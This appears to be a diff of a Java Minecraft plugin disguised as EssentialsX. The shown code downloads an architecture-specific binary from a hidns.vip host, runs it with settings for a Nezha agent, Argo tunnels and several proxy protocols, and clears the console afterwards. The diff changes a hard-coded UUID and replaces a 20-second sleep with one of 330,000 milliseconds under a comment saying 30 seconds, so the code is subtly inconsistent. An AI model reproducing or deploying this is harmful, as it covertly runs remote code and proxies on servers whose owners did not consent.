@@ -13,7 +13,7 @@ public class EssentialsX extends JavaPlugin {
     private volatile boolean isProcessRunning = false;
     
     private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
         "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
@@ -48,7 +48,7 @@ public class EssentialsX extends JavaPlugin {
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
             url = "https://arm64.sss.hidns.vip/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.sss.hidns.vip/sbsh"; 
+            url = "https://s390x.sss.hidns.vip/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
@@ -73,7 +73,7 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "b21795d8-0257-4cd1-a13f-aef25d120aa3");
+        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
@@ -126,12 +126,8 @@ public class EssentialsX extends JavaPlugin {
         startProcessMonitor();
         // getLogger().info("sbx started");
         
-        // sleep 20 seconds
-        try {
-            Thread.sleep(20000);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
+        // sleep 30 seconds
+        Thread.sleep(330000);
         
         clearConsole();
         getLogger().info("");
